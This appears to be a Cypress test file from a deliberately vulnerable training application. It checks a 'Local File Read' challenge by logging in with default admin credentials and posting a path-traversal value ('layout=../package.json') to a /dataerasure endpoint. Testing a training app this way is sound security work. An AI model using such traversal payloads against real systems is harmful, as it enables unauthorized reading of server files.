describe("/dataerasure", () => {
  beforeEach(() => {
    cy.login({ email: "admin", password: "admin123" });
  });

  describe('challenge "lfr"', () => {
    it("should be possible to perform local file read attack using the browser", () => {
      cy.window().then(() => {
        const xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function () {
          if (this.status === 200) {
            console.log("Success");
          }
        };
        const params = "layout=../package.json";

        xhttp.open("POST", `${Cypress.env("baseUrl")}/dataerasure`);
        xhttp.setRequestHeader(
          "Content-type",
          "application/x-www-form-urlencoded"
        );
        xhttp.setRequestHeader("Origin", `${Cypress.env("baseUrl")}/`);
        xhttp.setRequestHeader(
          "Cookie",
          `token=${localStorage.getItem("token")}`
        );
        xhttp.send(params); //eslint-disable-line
      });
      cy.visit("/");
      cy.expectChallengeSolved({ challenge: "Local File Read" });
    });
  });
});
